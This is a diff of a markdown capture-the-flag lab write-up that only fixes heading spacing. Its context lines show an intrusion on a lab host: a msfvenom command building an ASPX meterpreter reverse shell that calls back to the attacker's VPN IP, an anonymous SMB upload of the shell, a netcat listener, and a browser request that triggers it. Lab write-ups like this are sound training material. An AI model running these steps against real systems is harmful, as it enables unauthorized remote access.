@@ -168,7 +168,7 @@ http://10.201.66.41:49663/nt4wrksv/passwords.txt
 
 After confirming that the SMB share is directly accessible from the webserver, the next step was to gain remote code execution by uploading a malicious payload.  
 
-###1️⃣ Creating the Payload with msfvenom
+### 1️⃣ Creating the Payload with msfvenom
 I generated an **ASPX reverse shell payload** using `msfvenom`.  
 I set the **LHOST** (my VPN IP) and **LPORT** (4444) for the connection.  
 
@@ -177,7 +177,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YourVPN_IP> LPORT=4444 -f asp
 ```
 
 
-###2️⃣ Uploading the Payload to SMB Share
+### 2️⃣ Uploading the Payload to SMB Share
 
 Once the payload was ready, I uploaded it to the nt4wrksv SMB share:
 ```
@@ -185,14 +185,14 @@ smbclient //10.201.66.41/nt4wrksv -N
 put shell.aspx
 ```
 
-###3️⃣ Starting a Netcat Listener
+### 3️⃣ Starting a Netcat Listener
 
 To catch the reverse shell, I started a listener on port 4444:
 ```
 nc -lvnp 4444
 ```
 
-###4️⃣ Executing the Payload via Webserver
+### 4️⃣ Executing the Payload via Webserver
 
 Next, I navigated to the uploaded payload via the webserver:
 
@@ -201,7 +201,7 @@ http://10.201.66.41:49663/nt4wrksv/shell.aspx
 
 📷 Screenshot (empty page when payload executed)
 
-##✅ Result: Gained Shell
+## ✅ Result: Gained Shell
 
 As soon as I accessed the payload, the connection was established back to my listener.
 I successfully obtained a reverse shell on the target system.
